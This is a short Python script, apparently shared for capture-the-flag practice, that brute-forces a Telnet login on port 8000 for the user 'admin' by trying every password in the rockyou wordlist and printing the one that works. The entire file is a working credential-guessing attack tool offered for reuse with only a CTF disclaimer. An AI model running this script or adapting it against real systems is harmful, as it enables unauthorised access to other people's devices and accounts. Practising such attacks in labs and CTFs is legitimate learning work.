### Disclaimer this script is used for CTF and learning purposes only
### Anyone is welcome to use it 
# bsail 
import telnetlib
import time

# Target details
HOST = "10.x.x.x"    # Target IP
PORT = 8000               # Specified Telnet port
USERNAME = "admin"        # Target username

# Path to the password wordlist
WORDLIST = "/usr/share/wordlists/rockyou.txt" #Assuming this is where your wordlist lives
MAX_WAIT_TIME = 10        # Max wait time in seconds per attempt

def brute_force_telnet():
    with open(WORDLIST, 'r') as f:
        for password in f:
            password = password.strip()  # Clean up the password string
            print(f"Trying password: {password}")

            try:
                # Start a Telnet connection to the target
                tn = telnetlib.Telnet(HOST, PORT, timeout=MAX_WAIT_TIME)

                # Send the username
                tn.read_until(b"login: ", timeout=MAX_WAIT_TIME)
                tn.write(USERNAME.encode('ascii') + b"\n")

                # Send the password attempt
                tn.read_until(b"Password: ", timeout=MAX_WAIT_TIME)
                tn.write(password.encode('ascii') + b"\n")

                # Check the response after the password attempt
                response = tn.read_until(b"Password: ", timeout=MAX_WAIT_TIME).decode('ascii', errors='ignore')

                if "Password:" in response:
                    print("[-] Incorrect password.")
                else:
                    print(f"[+] Success! Password found: {password}")
                    tn.close()
                    return  # Stop after finding the correct password

                tn.close()

            except Exception as e:
                print(f"[-] Connection failed for password '{password}': {e}")
                time.sleep(1)  # Pause briefly before retrying

    print("[-] No valid password found in the wordlist.")

# Run the brute-force attempt
brute_force_telnet()

